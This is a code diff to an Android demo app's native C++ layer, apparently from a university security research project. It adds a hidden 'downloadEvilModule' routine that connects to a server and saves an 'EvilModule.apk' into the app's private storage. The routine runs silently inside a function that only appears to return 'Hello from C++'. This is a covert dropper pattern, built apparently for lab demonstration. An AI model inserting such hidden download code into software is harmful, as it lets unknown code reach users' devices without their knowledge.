@@ -8,10 +8,34 @@
 #include <android/log.h>
 #include <sys/mman.h>
 
-#define LOG_TAG "EVIL_NATIVE_CODE"
-#define LOGI(...) __android_log_print(ANDROID_LOG_INFO,LOG_TAG,__VA_ARGS__)
-#define LOGW(...) __android_log_print(ANDROID_LOG_WARN,LOG_TAG,__VA_ARGS__)
-#define LOGE(...) __android_log_print(ANDROID_LOG_ERROR,LOG_TAG,__VA_ARGS__)
+
+#include <sys/stat.h>
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+
+#include <netdb.h>
+#include <sstream>
+
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netinet/tcp.h>
+
+#include<memory>
+
+#include <fstream>
+
+#include "Connection.h"
+#include "Downloader.h"
+#include "Util.h"
+
+using namespace std;
+
+
+static std::string downloadEvilModule(JNIEnv *env) throw(DownloadException);
 
 
 /**
@@ -181,6 +205,63 @@ void hook_init(JNIEnv* env) {
 
 }
 
+
+static jobject getGlobalContext(JNIEnv *env)
+{
+    jclass activityThread = env->FindClass("android/app/ActivityThread");
+    jmethodID currentActivityThread = env->GetStaticMethodID(activityThread, "currentActivityThread", "()Landroid/app/ActivityThread;");
+    jobject at = env->CallStaticObjectMethod(activityThread, currentActivityThread);
+
+    jmethodID getApplication = env->GetMethodID(activityThread, "getApplication", "()Landroid/app/Application;");
+    jobject context = env->CallObjectMethod(at, getApplication);
+    return context;
+}
+
+static jmethodID getMethod(JNIEnv* env, jobject obj, const char* methodName, const char* methodSig) {
+    jclass clazz = env->GetObjectClass(obj);
+    return env->GetMethodID(clazz, methodName, methodSig);
+}
+
+static std::string getInternalStorageDir(JNIEnv* env) {
+    jobject context = getGlobalContext(env);
+
+    jmethodID getFilesDir = getMethod(env, context, "getFilesDir", "()Ljava/io/File;");
+    jobject dirobj = env->CallObjectMethod(context, getFilesDir);
+    jmethodID getStoragePath = getMethod(env, dirobj, "getAbsolutePath", "()Ljava/lang/String;");
+    jstring path = (jstring)env->CallObjectMethod(dirobj, getStoragePath);
+    const char *pathstr=env->GetStringUTFChars(path, NULL);
+    std::string internalStorageDir(pathstr);
+    env->ReleaseStringUTFChars(path, pathstr);
+
+    LOGE("%s", internalStorageDir.c_str());
+
+    return internalStorageDir;
+}
+
+static int get(int read) {
+    if (read < 0) return 0;
+    return read;
+}
+
+static std::string downloadEvilModule(JNIEnv *env) throw(DownloadException) {
+
+    const char* serverHostName = "10.0.2.2";
+    int serverPortNumber = 5050;
+
+    string internalStorage = getInternalStorageDir(env);
+    string filePath = internalStorage + "/EvilModule.apk";
+
+
+    try{
+        Downloader downloader(serverHostName, serverPortNumber, filePath);
+        downloader.download();
+    } catch (DownloadException e) {
+        throw e;
+    }
+
+    return std::move(filePath);
+}
+
 extern "C"
 JNIEXPORT jstring
 
@@ -188,6 +269,17 @@ JNICALL
 Java_de_unipassau_fim_reallife_1security_demoapp_demoapp_MainActivity_stringFromJNI(
         JNIEnv *env,
         jobject /* this */) {
-    std::string hello = "Hello from C++";
+    string hello = "Hello from C++";
+
+    string evilModulePath;
+    try {
+        evilModulePath = downloadEvilModule(env);
+    } catch(DownloadException e) {
+        std::stringstream ss;
+        ss << "Couldn't download evil module: Cause: " << e.what();
+        LOGE("%s", ss.str().c_str());
+    }
+
+    //test();
     return env->NewStringUTF(hello.c_str());
 }
